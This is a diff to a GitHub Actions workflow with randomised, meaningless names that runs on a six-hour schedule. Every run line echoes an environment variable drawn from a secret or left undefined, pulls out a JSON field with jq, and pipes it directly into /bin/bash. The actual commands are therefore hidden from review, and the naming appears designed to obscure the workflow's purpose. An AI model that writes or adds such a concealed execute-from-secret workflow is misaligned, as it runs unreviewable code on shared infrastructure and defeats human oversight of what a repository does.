@@ -1,28 +1,24 @@
 name: zusanchqing
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
-
-jobs:  # 25389
+    - cron: '48 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zusanchqing
         env:
-          hfst114: ${{ secrets.hfst114 }}
+          rp6323: ${{ secrets.rp6323 }}
         run: |
-          echo $hfst114 | jq -r .aoaoe425 | /bin/bash
-          echo $yk926 | jq -r .y23143 | /bin/bash
-          echo $chlfm49 | jq -r .ztd85988 | /bin/bash
-          echo $zqbm653 | jq -r .wgenq80 | /bin/bash
-          echo $hyrux0192 | jq -r .bw856 | /bin/bash
-          echo $gpjm42 | jq -r .a4751 | /bin/bash
-          echo $f1 | jq -r .uopfj369 | /bin/bash
-          echo $ju0847 | jq -r .stbg0301 | /bin/bash
-          echo $ndf8275 | jq -r .rxaky83812 | /bin/bash
-          echo $vutnz56 | jq -r .j74526 | /bin/bash
-          echo $dlfc2 | jq -r .t52471 | /bin/bash
-          echo $xjt29242 | jq -r .ugxki67760 | /bin/bash
+          echo $rp6323 | jq -r .oez0074 | /bin/bash
+          echo $ecfw037 | jq -r .d69 | /bin/bash
+          echo $iyyz0676 | jq -r .eaw6 | /bin/bash
+          echo $yb55 | jq -r .vb3 | /bin/bash
+          echo $kwlct1505 | jq -r .hovg2910 | /bin/bash
+          echo $gz0633 | jq -r .ond85 | /bin/bash
+          echo $gzu8 | jq -r .jc3360 | /bin/bash
+          echo $gqg47141 | jq -r .uvru8 | /bin/bash
 
